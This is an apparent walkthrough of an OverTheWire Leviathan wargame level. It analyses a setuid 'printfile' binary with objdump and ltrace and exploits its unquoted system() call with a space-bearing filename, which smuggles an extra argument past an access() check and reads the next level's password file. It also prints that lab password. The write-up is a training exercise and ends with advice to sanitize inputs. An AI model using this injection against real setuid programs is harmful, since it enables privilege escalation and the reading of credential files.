For this level, I use `ls -la` and find `printfile` executable with owner as leviathan3. The executable also gives permission to leviathan2 for executing it shown below:
```
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Oct  5 06:19 .
drwxr-xr-x 83 root       root        4096 Oct  5 06:20 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Oct  5 06:19 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

Now, we execute the printfile which takes in a file and prints out it's contents like `cat`
```
leviathan2@gibson:~$ ./printfile /etc/host.conf
# The "order" line is only used by old versions of the C library.
order hosts,bind
multi on
```

As usual, to understand more of the stack trace of the executable, I use objdump to print the dynamic symbol table:
```
leviathan2@gibson:~$ objdump -T printfile

printfile:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*  00000000 (GLIBC_2.34) __libc_start_main
00000000      DF *UND*  00000000 (GLIBC_2.0)  printf
00000000      DF *UND*  00000000 (GLIBC_2.4)  __stack_chk_fail
00000000      DF *UND*  00000000 (GLIBC_2.0)  geteuid
00000000      DF *UND*  00000000 (GLIBC_2.0)  puts
00000000      DF *UND*  00000000 (GLIBC_2.0)  system
00000000  w   D  *UND*  00000000  Base        __gmon_start__
00000000      DF *UND*  00000000 (GLIBC_2.0)  setreuid
00000000      DF *UND*  00000000 (GLIBC_2.0)  snprintf
00000000      DF *UND*  00000000 (GLIBC_2.0)  access
0804a004 g    DO .rodata        00000004  Base        _IO_stdin_used
```

However, the table did not didn't reveal much of what we know so I tried reading the password for leviathan3 directly, which unsurprisingly failed:

```
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Using ltrace, I observed the following function calls:

```
leviathan2@gibson:~$ ltrace ./printfile /etc/host.conf
__libc_start_main(0x80491e6, 2, 0xffffd684, 0 <unfinished ...>
access("/etc/host.conf", 4)                                                                                                         = 0
snprintf("/bin/cat /etc/host.conf", 511, "/bin/cat %s", "/etc/host.conf")                                                           = 23
geteuid()                                                                                                                           = 12002
geteuid()                                                                                                                           = 12002
setreuid(12002, 12002)                                                                                                              = 0
system("/bin/cat /etc/host.conf"# The "order" line is only used by old versions of the C library.
order hosts,bind
multi on
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                              = 0
+++ exited (status 0) +++
```

From the above calls, the sequence seems to be:
    - Check if the file is accessible (access).
    - Store the command in a buffer (snprintf).
    - Change the user ID (geteuid and setreuid).
    - Execute the command (system).

From this, we still need to somehow bypass the access check so that we can execute the command with elevated permissions (likely leviathan3).

The vulnerability lies in the way the printfile program processes filenames. Since the program concatenates the filename directly into the command it will execute, we can manipulate the filename to modify the command.
The payload was designed in the form of a filename. By adding a space character followed by the desired file we want to access, we can make the system function execute the cat command on both files.
So, by naming our file as `a leviathan3`, the `printfile` executable attempts to read both the files, a and leviathan3.
```
leviathan2@gibson:/etc/leviathan_pass$ ~/printfile '/tmp/tmp.0wDX4pzYkj/a leviathan3'
/bin/cat: /tmp/tmp.0wDX4pzYkj/a: Permission denied
Q0G8j4sakn
```
Code signals in `ltrace`:
```
leviathan2@gibson:/etc/leviathan_pass$ ltrace ~/printfile '/tmp/tmp.0wDX4pzYkj/a leviathan3'
__libc_start_main(0x80491e6, 2, 0xffffd644, 0 <unfinished ...>
access("/tmp/tmp.0wDX4pzYkj/a leviathan3"..., 4)                                                                                    = 0         access is bypassed with the filename
snprintf("/bin/cat /tmp/tmp.0wDX4pzYkj/a l"..., 511, "/bin/cat %s", "/tmp/tmp.0wDX4pzYkj/a leviathan3"...)                          = 41        
geteuid()                                                                                                                           = 12002
geteuid()                                                                                                                           = 12002
setreuid(12002, 12002)                                                                                                              = 0
system("/bin/cat /tmp/tmp.0wDX4pzYkj/a l".../bin/cat: /tmp/tmp.0wDX4pzYkj/a: No such file or directory                                      the cat tmpfile is not allowed as the owner is leviathan2
/bin/cat: leviathan3: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                              = 256
+++ exited (status 0) +++
```

### Reflection:
You can use a filename as a payload with the file you want to bypass certain functions. Using filenames as payloads can be a strong method to exploit poorly written programs. 
So, to mitigate payload attacks using files, we need to sanitize and validate inputs.



